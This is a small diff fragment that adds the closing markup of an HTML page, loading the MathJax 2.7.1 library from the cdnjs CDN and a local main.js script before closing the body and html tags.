+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
